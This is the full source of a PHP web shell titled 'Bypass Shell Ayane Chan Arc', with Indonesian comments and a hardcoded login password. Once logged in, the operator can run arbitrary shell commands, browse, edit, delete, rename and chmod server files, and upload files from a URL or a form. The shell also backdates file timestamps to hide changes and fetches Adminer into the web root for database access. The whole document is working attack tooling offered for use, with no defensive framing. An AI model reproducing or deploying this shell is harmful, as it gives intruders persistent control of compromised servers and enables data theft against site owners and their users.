<?php
session_start();

define('PASSWORD', 'ayane111'); // Password untuk kontrol akses

// Proses login
if (isset($_POST['password'])) {
    if ($_POST['password'] === PASSWORD) {
        $_SESSION['authenticated'] = true;
        echo '<audio autoplay><source src="https://c.top4top.io/m_3136q2v7f1.mp3" type="audio/mpeg"></audio>';
    } else {
        echo "<div class='alert alert-danger text-center'>Password salah.</div>";
    }
}

// Proses logout
if (isset($_POST['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
    // Tampilkan form login jika belum terautentikasi
    echo '
    <style>
        body {
            background: linear-gradient(135deg, pink 50%, #ffcccb 50%);
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .login-card {
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            padding: 20px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            background-color: white;
        }
        .login-card img {
            max-width: 100%;
            height: auto;
            margin-bottom: 20px;
        }
        .login-card h1 {
            margin-bottom: 20px;
            animation: colorChange 3s infinite;
        }
        @keyframes colorChange {
            0%, 100% {
                color: pink;
            }
            50% {
                color: lightblue;
            }
        }
        .login-card .form-group {
            margin-bottom: 15px;
        }
        .login-card .btn {
            width: 100%;
        }
    </style>
    <div class="login-card">
        <h1>Bypass Shell Ayane Chan Arc</h1>
        <img src="https://i.pinimg.com/564x/79/85/d8/7985d80888988a81764ef03feeaafdfb.jpg" alt="Banner Image" class="img-fluid">
        <form method="post">
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" class="form-control text-center" placeholder="Masukkan password" required>
            </div>
            <button type="submit" class="btn btn-primary">Login</button>
        </form>
    </div>';
    exit;
}

// Fungsi untuk menampilkan informasi sistem
function displaySystemInfo() {
    $info = [
        'System' => php_uname(),
        'PHP Version' => phpversion(),
        'Server IP' => $_SERVER['SERVER_ADDR'],
        'Client IP' => $_SERVER['REMOTE_ADDR'],
        'Document Root' => $_SERVER['DOCUMENT_ROOT'],
        'Server Software' => $_SERVER['SERVER_SOFTWARE'],
    ];

    foreach ($info as $key => $value) {
        echo "<p><strong>$key:</strong> $value</p>";
    }
}

// Fungsi untuk menampilkan informasi jaringan
function displayNetworkInfo() {
    $info = [
        'Hostname' => gethostname(),
        'Server IP Address' => $_SERVER['SERVER_ADDR'],
        'Client IP Address' => $_SERVER['REMOTE_ADDR'],
        'Server Port' => $_SERVER['SERVER_PORT'],
        'Client Port' => $_SERVER['REMOTE_PORT'],
        'Request Method' => $_SERVER['REQUEST_METHOD'],
        'User Agent' => $_SERVER['HTTP_USER_AGENT'],
    ];

    foreach ($info as $key => $value) {
        echo "<p><strong>$key:</strong> $value</p>";
    }
}

// Fungsi untuk mengubah tanggal modifikasi file
function changeFileDate($path, $newDate) {
    $timestamp = strtotime($newDate);
    if (touch($path, $timestamp)) {
        echo "<div class='alert alert-success'>Tanggal berhasil diubah.</div>";
    } else {
        echo "<div class='alert alert-danger'>Gagal mengubah tanggal.</div>";
    }
}

// Fungsi upload file dari URL
function uploadFromUrl($url, $saveTo) {
    $fileContent = @file_get_contents($url);
    if ($fileContent === FALSE) {
        echo "<div class='alert alert-danger'>Gagal mengunduh file dari URL.</div>";
        return;
    }
    if (@file_put_contents($saveTo, $fileContent) === FALSE) {
        echo "<div class='alert alert-danger'>Gagal menyimpan file ke $saveTo.</div>";
        return;
    }
    echo "<div class='alert alert-success'>File berhasil diupload: $saveTo</div>";
}

// Fungsi upload file dari form
function uploadFromForm($file, $saveTo) {
    if (@move_uploaded_file($file['tmp_name'], $saveTo)) {
        echo "<div class='alert alert-success'>File berhasil diupload: $saveTo</div>";
    } else {
        echo "<div class='alert alert-danger'>Gagal mengupload file.</div>";
    }
}

// Fungsi untuk memecah nama file panjang menjadi beberapa baris
function format_filename($filename) {
    if (strlen($filename) > 15) {
        return wordwrap($filename, 15, "<br>");
    }
    return $filename;
}

// Fungsi untuk menampilkan warna merah untuk file atau folder yang terkunci atau milik root
function get_file_style($path) {
    $perms = fileperms($path);
    $owner = fileowner($path);
    
    // Cek apakah file milik root atau memiliki izin terbatas
    if ($owner === 0 || !is_writable($path)) {
        return "color: red;"; // Warna merah
    }
    
    return ""; // Warna default
}

// Fungsi untuk menampilkan direktori dan file
function display_path_links($dir) {
    if (is_dir($dir)) {
        $folders = [];
        $files = [];

        $items = scandir($dir);
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;

            if (is_dir($dir . '/' . $item)) {
                $folders[] = $item;
            } else {
                $files[] = $item;
            }
        }

        foreach ($folders as $folder) {
            $folderPath = realpath($dir . '/' . $folder);
            $encodedPath = urlencode(base64_encode($folderPath));
            $style = get_file_style($folderPath);
            echo "<div class='list-group-item d-flex justify-content-between align-items-center' style='$style'>";
            echo "<a href='?dir=$encodedPath' class='btn btn-link'>" . format_filename($folder) . "/</a>";
            echo "<span class='ml-auto'>" . get_permissions($folderPath) . "</span>";
            echo "<span class='ml-2'>" . date("Y-m-d H:i:s", filemtime($folderPath)) . "</span>";
            echo "<button class='btn btn-warning btn-sm ml-2' onclick=\"showForm('rename-$folder')\">Ganti Nama</button>";
            echo "<button class='btn btn-secondary btn-sm ml-2' onclick=\"showForm('chmod-$folder')\">Ubah Chmod</button>";
            echo "<button class='btn btn-info btn-sm ml-2' onclick=\"showForm('date-$folder')\">Ubah Tanggal</button>";
            echo "<button class='btn btn-danger btn-sm ml-2' onclick=\"showForm('delete-$folder')\">Hapus</button>";
            echo "</div>";

            // Form Rename
            echo "<div id='rename-$folder' class='form-popup'>
                    <form method='post' class='form-container'>
                        <h4>Ganti Nama</h4>
                        <label for='destination'><b>Nama Baru</b></label>
                        <input type='text' placeholder='Masukkan nama baru' name='destination' required>
                        <input type='hidden' name='source' value='$encodedPath'>
                        <button type='submit' name='rename' class='btn btn-primary'>Ganti Nama</button>
                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('rename-$folder')\">Batal</button>
                    </form>
                </div>";

            // Form Chmod
            echo "<div id='chmod-$folder' class='form-popup'>
                    <form method='post' class='form-container'>
                        <h4>Ubah Chmod</h4>
                        <div class='form-group'>
                            <label for='chmodMode-$folder'>Pilih Mode</label>
                            <select id='chmodMode-$folder' name='chmodMode' onchange=\"toggleChmodInput('$folder')\">
                                <option value=''>Pilih Mode Chmod</option>
                                <option value='biasa'>Biasa</option>
                                <option value='manual'>Manual</option>
                                <option value='copy'>chmod salin file/folder lain</option>
                            </select>
                        </div>
                        <div class='form-group' id='chmodBiasa-$folder' style='display:none;'>
                            <input type='text' id='mode-$folder' name='mode' placeholder='0755'>
                        </div>
                        <div class='form-group' id='chmodManual-$folder' style='display:none;'>
                            <input type='text' id='chmodInput-$folder' name='manualChmod' placeholder='-rw-r--r--'>
                        </div>
                        <div class='form-group' id='chmodCopy-$folder' style='display:none;'>
                            <input type='text' id='copyChmod-$folder' name='copyChmod' placeholder='Masukkan nama file'>
                        </div>
                        <input type='hidden' name='source' value='$encodedPath'>
                        <button type='submit' name='chmod' class='btn btn-primary'>Ubah Chmod</button>
                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('chmod-$folder')\">Batal</button>
                    </form>
                </div>";

            // Form Ubah Tanggal
            echo "<div id='date-$folder' class='form-popup'>
                    <form method='post' class='form-container'>
                        <h4>Ubah Tanggal</h4>
                        <label for='newdate'><b>Tanggal Baru</b></label>
                        <input type='datetime-local' name='newdate' required>
                        <input type='hidden' name='source' value='$encodedPath'>
                        <button type='submit' name='changedate' class='btn btn-primary'>Ubah Tanggal</button>
                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('date-$folder')\">Batal</button>
                    </form>
                </div>";

            // Delete Confirmation
            echo "<div id='delete-$folder' class='form-popup'>
                    <form method='post' class='form-container'>
                        <h4>Hapus Folder</h4>
                        <p>Apakah Anda yakin ingin menghapus folder ini?</p>
                        <input type='hidden' name='path' value='$encodedPath'>
                        <button type='submit' name='delete' class='btn btn-danger'>Hapus</button>
                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('delete-$folder')\">Batal</button>
                    </form>
                </div>";
        }

        foreach ($files as $file) {
            $filePath = realpath($dir . '/' . $file);
            $encodedPath = urlencode(base64_encode($filePath));
            $style = get_file_style($filePath);
            echo "<div class='list-group-item d-flex justify-content-between align-items-center' style='$style'>";
            echo "<span>" . format_filename($file) . "</span>";
            echo "<span class='ml-auto'>" . get_permissions($filePath) . "</span>";
            echo "<span class='ml-2'>" . date("Y-m-d H:i:s", filemtime($filePath)) . "</span>";
            echo "<button class='btn btn-warning btn-sm ml-2' onclick=\"showForm('rename-$file')\">Ganti Nama</button>";
            echo "<button class='btn btn-secondary btn-sm ml-2' onclick=\"showForm('chmod-$file')\">Ubah Chmod</button>";
            echo "<button class='btn btn-info btn-sm ml-2' onclick=\"showForm('date-$file')\">Ubah Tanggal</button>";
            echo "<button class='btn btn-primary btn-sm ml-2' onclick=\"showForm('edit-$file')\">Edit</button>";
            echo "<button class='btn btn-danger btn-sm ml-2' onclick=\"showForm('delete-$file')\">Hapus</button>";
            echo "<a href='?download=$encodedPath' class='btn btn-info btn-sm ml-2'>Download</a>";
            echo "</div>";

            // Form Rename
            echo "<div id='rename-$file' class='form-popup'>
                    <form method='post' class='form-container'>
                        <h4>Ganti Nama</h4>
                        <label for='destination'><b>Nama Baru</b></label>
                        <input type='text' placeholder='Masukkan nama baru' name='destination' required>
                        <input type='hidden' name='source' value='$encodedPath'>
                        <button type='submit' name='rename' class='btn btn-primary'>Ganti Nama</button>
                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('rename-$file')\">Batal</button>
                    </form>
                </div>";

            // Form Chmod
            echo "<div id='chmod-$file' class='form-popup'>
                    <form method='post' class='form-container'>
                        <h4>Ubah Chmod</h4>
                        <div class='form-group'>
                            <label for='chmodMode-$file'>Pilih Mode</label>
                            <select id='chmodMode-$file' name='chmodMode' onchange=\"toggleChmodInput('$file')\">
                                <option value=''>Pilih Mode Chmod</option>
                                <option value='biasa'>Biasa</option>
                                <option value='manual'>Manual</option>
                                <option value='copy'>chmod salin file/folder lain</option>
                            </select>
                        </div>
                        <div class='form-group' id='chmodBiasa-$file' style='display:none;'>
                            <input type='text' id='mode-$file' name='mode' placeholder='0755'>
                        </div>
                        <div class='form-group' id='chmodManual-$file' style='display:none;'>
                            <input type='text' id='chmodInput-$file' name='manualChmod' placeholder='-rw-r--r--'>
                        </div>
                        <div class='form-group' id='chmodCopy-$file' style='display:none;'>
                            <input type='text' id='copyChmod-$file' name='copyChmod' placeholder='Masukkan nama file'>
                        </div>
                        <input type='hidden' name='source' value='$encodedPath'>
                        <button type='submit' name='chmod' class='btn btn-primary'>Ubah Chmod</button>
                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('chmod-$file')\">Batal</button>
                    </form>
                </div>";

            // Form Ubah Tanggal
            echo "<div id='date-$file' class='form-popup'>
                    <form method='post' class='form-container'>
                        <h4>Ubah Tanggal</h4>
                        <label for='newdate'><b>Tanggal Baru</b></label>
                        <input type='datetime-local' name='newdate' required>
                        <input type='hidden' name='source' value='$encodedPath'>
                        <button type='submit' name='changedate' class='btn btn-primary'>Ubah Tanggal</button>
                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('date-$file')\">Batal</button>
                    </form>
                </div>";

            // Form Edit
            echo "<div id='edit-$file' class='form-popup'>
                    <form method='post' class='form-container'>
                        <h4>Edit File</h4>
                        <textarea name='content' rows='10' class='form-control'>" . htmlspecialchars(file_get_contents($filePath)) . "</textarea>
                        <input type='hidden' name='editSource' value='$encodedPath'>
                        <button type='submit' name='saveEdit' class='btn btn-primary'>Simpan</button>
                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('edit-$file')\">Batal</button>
                    </form>
                </div>";

            // Delete Confirmation
            echo "<div id='delete-$file' class='form-popup'>
                    <form method='post' class='form-container'>
                        <h4>Hapus File</h4>
                        <p>Apakah Anda yakin ingin menghapus file ini?</p>
                        <input type='hidden' name='path' value='$encodedPath'>
                        <button type='submit' name='delete' class='btn btn-danger'>Hapus</button>
                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('delete-$file')\">Batal</button>
                    </form>
                </div>";
        }
    } else {
        echo "<div class='alert alert-danger'>Direktori tidak ditemukan.</div>";
    }
}

// Fungsi untuk menampilkan izin file
function get_permissions($file) {
    $perms = @fileperms($file);
    if ($perms === FALSE) return '---------';

    $info = ($perms & 0x4000) ? 'd' : '-';
    $info .= ($perms & 0x0100) ? 'r' : '-';
    $info .= ($perms & 0x0080) ? 'w' : '-';
    $info .= ($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-');
    $info .= ($perms & 0x0020) ? 'r' : '-';
    $info .= ($perms & 0x0010) ? 'w' : '-';
    $info .= ($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-');
    $info .= ($perms & 0x0004) ? 'r' : '-';
    $info .= ($perms & 0x0002) ? 'w' : '-';
    $info .= ($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-');

    return $info;
}

// Fungsi untuk menghapus item
function deleteItem($path) {
    $path = base64_decode(urldecode($path));
    if (is_dir($path)) {
        if (@rmdir($path)) {
            echo "<div class='alert alert-success'>Direktori berhasil dihapus.</div>";
        } else {
            echo "<div class='alert alert-danger'>Gagal menghapus direktori.</div>";
        }
    } else {
        if (@unlink($path)) {
            echo "<div class='alert alert-success'>File berhasil dihapus.</div>";
        } else {
            echo "<div class='alert alert-danger'>Gagal menghapus file.</div>";
        }
    }
}

// Fungsi untuk rename file/folder
function renameFile($source, $destination) {
    $source = base64_decode(urldecode($source));
    if (@rename($source, $destination)) {
        echo "<div class='alert alert-success'>File berhasil diganti namanya.</div>";
    } else {
        echo "<div class='alert alert-danger'>Gagal mengganti nama file.</div>";
    }
}

// Fungsi untuk mengubah chmod
function changePermissions($path, $mode, $copyFrom = null, $manual = false) {
    $path = base64_decode(urldecode($path));
    if ($copyFrom) {
        $copyFrom = realpath($copyFrom);
        if ($copyFrom && file_exists($copyFrom)) {
            $mode = @fileperms($copyFrom) & 0777; // Ambil izin chmod dari file lain
        } else {
            echo "<div class='alert alert-danger'>File sumber chmod tidak ditemukan.</div>";
            return;
        }
    } elseif ($manual) {
        $mode = str2oct($mode); // Konversi dari format string ke oktal
    } else {
        $mode = octdec($mode);
    }

    if (@chmod($path, $mode)) {
        echo "<div class='alert alert-success'>Chmod berhasil diubah.</div>";
    } else {
        echo "<div class='alert alert-danger'>Gagal mengubah chmod.</div>";
    }
}

// Fungsi untuk mengubah tanggal modifikasi file
function changeDate($path, $newdate) {
    $path = base64_decode(urldecode($path));
    changeFileDate($path, $newdate);
}

// Fungsi untuk mengedit file
function editFile($path, $content) {
    $path = base64_decode(urldecode($path));
    if (@file_put_contents($path, $content) !== false) {
        echo "<div class='alert alert-success'>File berhasil diedit.</div>";
    } else {
        echo "<div class='alert alert-danger'>Gagal mengedit file.</div>";
    }
}

// Fungsi untuk menjalankan perintah terminal
function executeCommand($command, $dir) {
    chdir($dir);
    $output = @shell_exec($command);
    return htmlspecialchars($output);
}

// Fungsi untuk meng-upload Adminer
function uploadAdminer($filename, $dir) {
    $url = "https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-en.php";
    $saveTo = rtrim($dir, '/') . '/' . $filename . '.php';
    uploadFromUrl($url, $saveTo);
}

// Proses permintaan yang diterima
if (isset($_POST['url']) && isset($_POST['dir'])) {
    $url = $_POST['url'];
    $uploadDir = base64_decode(urldecode($_POST['dir']));
    $filename = basename($url);
    $savePath = rtrim($uploadDir, '/') . '/' . $filename;

    uploadFromUrl($url, $savePath);
}

if (isset($_FILES['file']) && isset($_POST['dir'])) {
    $uploadDir = base64_decode(urldecode($_POST['dir']));
    $filename = basename($_FILES['file']['name']);
    $savePath = rtrim($uploadDir, '/') . '/' . $filename;

    uploadFromForm($_FILES['file'], $savePath);
}

if (isset($_POST['delete']) && isset($_POST['path'])) {
    deleteItem($_POST['path']);
}

if (isset($_POST['rename']) && isset($_POST['source']) && isset($_POST['destination'])) {
    renameFile($_POST['source'], $_POST['destination']);
}

if (isset($_POST['chmod']) && isset($_POST['source'])) {
    $chmodMode = $_POST['chmodMode'];
    $copyFrom = isset($_POST['copyChmod']) && !empty($_POST['copyChmod']) ? $_POST['copyChmod'] : null;
    $manual = isset($_POST['manualChmod']) && !empty($_POST['manualChmod']) ? $_POST['manualChmod'] : null;
    $mode = isset($_POST['mode']) && !empty($_POST['mode']) ? $_POST['mode'] : '';

    switch ($chmodMode) {
        case 'biasa':
            changePermissions($_POST['source'], $mode);
            break;
        case 'manual':
            changePermissions($_POST['source'], $manual, null, true);
            break;
        case 'copy':
            changePermissions($_POST['source'], '', $copyFrom);
            break;
        default:
            echo "<div class='alert alert-danger'>Mode chmod tidak valid.</div>";
    }
}

if (isset($_POST['changedate']) && isset($_POST['source']) && isset($_POST['newdate'])) {
    changeDate($_POST['source'], $_POST['newdate']);
}

if (isset($_POST['saveEdit']) && isset($_POST['editSource']) && isset($_POST['content'])) {
    editFile($_POST['editSource'], $_POST['content']);
}

if (isset($_POST['command']) && isset($_POST['dir'])) {
    $command = $_POST['command'];
    $dir = base64_decode(urldecode($_POST['dir']));
    $commandOutput = executeCommand($command, $dir);
}

if (isset($_POST['uploadAdminer']) && isset($_POST['adminerFilename']) && isset($_POST['dir'])) {
    $filename = $_POST['adminerFilename'];
    $dir = base64_decode(urldecode($_POST['dir']));
    uploadAdminer($filename, $dir);
}

if (isset($_GET['download'])) {
    $file = base64_decode(urldecode($_GET['download']));
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file));
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// Fungsi untuk mengubah izin manual ke oktal
function str2oct($str) {
    $oct = array(0, 0, 0);

    for ($i = 0; $i < 3; $i++) {
        if ($str[$i * 3 + 1] == 'r') $oct[$i] += 4;
        if ($str[$i * 3 + 2] == 'w') $oct[$i] += 2;
        if ($str[$i * 3 + 3] == 'x' || $str[$i * 3 + 3] == 's' || $str[$i * 3 + 3] == 't') $oct[$i] += 1;
    }

    return octdec(implode('', $oct));
}

$dir = isset($_GET['dir']) ? base64_decode(urldecode($_GET['dir'])) : '.';
$displayDir = realpath($dir);

$dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($val) { return $val !== ''; });
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=1024">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bypass Shell Ayane Chan Arc</title>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background: linear-gradient(135deg, pink 50%, #ffcccb 50%);
            min-width: 1024px;
        }

        .form-popup {
            display: none;
            position: fixed;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            z-index: 9;
            background-color: white;
            border: 1px solid #888;
            width: 400px;
            padding: 20px;
            box-shadow: 0px 0px 10px 0px #000;
        }

        .form-container h4 {
            margin-bottom: 15px;
        }

        .form-container input[type=text], .form-container textarea, .form-container input[type=datetime-local] {
            width: 100%;
            padding: 10px;
            margin: 5px 0 10px 0;
            border: none;
            background: #f1f1f1;
        }

        .form-container .btn {
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
            width: 100%;
            margin-bottom:10px;
            opacity: 0.8;
        }

        .form-container .btn.cancel {
            background-color: red;
        }

        .form-container .btn:hover, .open-button:hover {
            opacity: 1;
        }
        
        .info-sites, .network-info {
            display: none;
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
        }

        .info-sites {
            background-color: #e9ecef;
        }

        .network-info {
            background-color: #e2e3e5;
        }
    </style>
</head>
<body>
    <div class="container mt-5">
        <?php if (isset($_SESSION['authenticated']) && $_SESSION['authenticated']): ?>
        <h1 class="mb-4 text-center">Bypass Shell Ayane Chan Arc</h1>
        <div class="text-center mb-4">
            <img src="https://i.pinimg.com/564x/b6/ac/db/b6acdba14a2632ae4bc67088ba0c0422.jpg" alt="Welcome Image" class="img-fluid">
        </div>
        <div class="text-center mb-4">
            <form method="post" class="d-inline">
                <button type="submit" name="logout" class="btn btn-danger">Logout</button>
            </form>
            <button class="btn btn-primary" onclick="toggleInfoSites()">Informasi Web</button>
            <button class="btn btn-secondary" onclick="toggleNetworkInfo()">Network Info</button>
            <button class="btn btn-info" onclick="showForm('adminer-upload')">Upload Adminer</button>
        </div>

        <!-- Form Upload Adminer -->
        <div id="adminer-upload" class="form-popup">
            <form method="post" class="form-container">
                <h4>Upload Adminer</h4>
                <label for="adminerFilename"><b>Nama File</b></label>
                <input type="text" placeholder="Masukkan nama file" name="adminerFilename" required>
                <input type="hidden" name="dir" value="<?php echo urlencode(base64_encode($dir)); ?>">
                <button type="submit" name="uploadAdminer" class="btn btn-primary">Upload</button>
                <button type="button" class='btn btn-secondary' onclick="hideForm('adminer-upload')">Batal</button>
            </form>
        </div>

        <!-- Informasi Web -->
        <div id="infoSites" class="info-sites">
            <?php displaySystemInfo(); ?>
        </div>

        <!-- Informasi Jaringan -->
        <div id="networkInfo" class="network-info">
            <?php displayNetworkInfo(); ?>
        </div>

        <h2 class="mt-4">Upload File ke Direktori Saat Ini</h2>
        <form method="post">
            <div class="form-group">
                <label for="url">URL File</label>
                <input type="text" id="url" name="url" class="form-control" placeholder="Masukkan URL file" required>
            </div>
            <input type="hidden" name="dir" value="<?php echo urlencode(base64_encode($dir)); ?>">
            <button type="submit" class="btn btn-primary">Upload dari URL</button>
        </form>
        
        <form method="post" enctype="multipart/form-data">
            <div class="form-group">
                <label for="file">Pilih File untuk Diupload</label>
                <input type="file" id="file" name="file" class="form-control" required>
            </div>
            <input type="hidden" name="dir" value="<?php echo urlencode(base64_encode($dir)); ?>">
            <button type="submit" class="btn btn-primary">Upload File</button>
        </form>

        <h2 class="mt-4">Daftar Direktori</h2>
        <div class="alert alert-info">
            <strong>Direktori Saat Ini:</strong> 
            <?php
            $currentPath = '/';
            echo "<a href='?dir=" . urlencode(base64_encode('/')) . "' class='btn btn-link'>/</a> ";
            foreach ($dirArray as $index => $folder) {
                $currentPath .= htmlspecialchars($folder) . '/';
                $encodedPath = urlencode(base64_encode($currentPath));
                echo "<a href='?dir=$encodedPath' class='btn btn-link'>" . htmlspecialchars($folder) . "</a>";
                if ($index < count($dirArray) - 1) {
                    echo " / ";
                }
            }
            ?>
        </div>
        <div class="list-group">
            <?php
            display_path_links($dir);
            ?>
        </div>

        <h2 class="mt-4">Terminal</h2>
        <form method="post">
            <div class="form-group">
                <label for="command">Command</label>
                <input type="text" id="command" name="command" class="form-control" placeholder="Masukkan perintah" required>
            </div>
            <input type="hidden" name="dir" value="<?php echo urlencode(base64_encode($dir)); ?>">
            <button type="submit" class="btn btn-primary">Jalankan</button>
        </form>
        <?php if (isset($commandOutput)): ?>
            <pre class="mt-4"><?php echo $commandOutput; ?></pre>
        <?php endif; ?>

        <footer class="text-center mt-4">
            <small>&copy; <?php echo date("Y"); ?> Bypass Shell Ayane Chan Arc</small>
        </footer>
        <?php else: ?>
        <!-- Konten halaman login jika belum terautentikasi -->
        <?php endif; ?>
    </div>
    <script>
        function showForm(formId) {
            document.getElementById(formId).style.display = 'block';
        }

        function hideForm(formId) {
            document.getElementById(formId).style.display = 'none';
        }

        function toggleInfoSites() {
            var element = document.getElementById("infoSites");
            element.style.display = (element.style.display === "none" || element.style.display === "") ? "block" : "none";
        }

        function toggleNetworkInfo() {
            var element = document.getElementById("networkInfo");
            element.style.display = (element.style.display === "none" || element.style.display === "") ? "block" : "none";
        }

        function toggleChmodInput(id) {
            var mode = document.getElementById('chmodMode-' + id).value;
            document.getElementById('chmodBiasa-' + id).style.display = (mode === 'biasa') ? 'block' : 'none';
            document.getElementById('chmodManual-' + id).style.display = (mode === 'manual') ? 'block' : 'none';
            document.getElementById('chmodCopy-' + id).style.display = (mode === 'copy') ? 'block' : 'none';
        }
    </script>
</body>
</html>
